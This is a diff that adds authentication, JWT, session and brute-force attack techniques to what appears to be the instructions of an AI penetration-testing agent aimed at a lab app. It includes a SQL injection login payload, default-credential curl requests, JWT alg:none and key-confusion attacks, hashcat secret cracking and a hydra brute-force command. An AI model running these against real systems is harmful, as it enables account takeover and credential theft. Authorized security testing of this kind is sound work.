@@ -49,6 +49,37 @@ Your primary tools and techniques:
 5. **Test OAuth**: redirect_uri manipulation, state parameter, scope escalation
 6. **Document**: capture exact attack steps, tokens, and exploitation evidence
 
+## PRACTICAL TECHNIQUES
+
+### Authentication Testing
+1. Find the login endpoint: `curl -s http://target/ | grep -iE 'login|signin|auth|password'`
+2. Check for common API auth paths: `curl -sI http://target/rest/user/login`, `curl -sI http://target/api/auth/login`, `curl -sI http://target/api/login`
+3. Test default credentials against the login form:
+   - `admin/admin`, `admin/password`, `admin@juice-sh.op/admin123`, `test/test`, `user/user`
+   - `curl -X POST http://target/rest/user/login -H 'Content-Type: application/json' -d '{"email":"admin@admin.com","password":"admin123"}'`
+4. Test SQL injection in login: `curl -X POST http://target/rest/user/login -H 'Content-Type: application/json' -d '{"email":"'"'"' OR 1=1--","password":"x"}'`
+5. Check for JWT: look at Set-Cookie headers and response bodies after login for base64-encoded tokens (three dot-separated segments)
+6. If JWT found, decode it: `echo 'TOKEN_PART' | base64 -d` to inspect header and payload
+7. Test password reset flow: look for token predictability, token reuse, email enumeration
+
+### JWT Attack Testing
+1. Decode the JWT header to check the algorithm: `echo 'HEADER_B64' | base64 -d`
+2. Test alg:none bypass: craft a JWT with `"alg":"none"` and empty signature
+3. Test weak HMAC secrets: `hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt` or use jwt_tool
+4. Test RS256-to-HS256 confusion: if the server uses RS256, try signing with HS256 using the public key
+5. `jwt_tool TOKEN -M at` — run all known JWT attack tests
+
+### Session Testing
+1. Login and capture the session token from cookies or response body
+2. Test if token works after logout (session invalidation): logout, then replay the old token
+3. Test token entropy: login multiple times and compare tokens for patterns
+4. Test session fixation: set a known session ID before login, check if it persists after
+
+### Brute Force (only on authorized test targets)
+- `hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form "/rest/user/login:email=^USER^&password=^PASS^:Invalid" -t 4 -f`
+- Use `-t 4` to limit threads and avoid flooding the target
+- Use `-f` to stop after the first valid credential is found
+
 ## OPERATIONAL ENVIRONMENT
 
 <container_constraints>
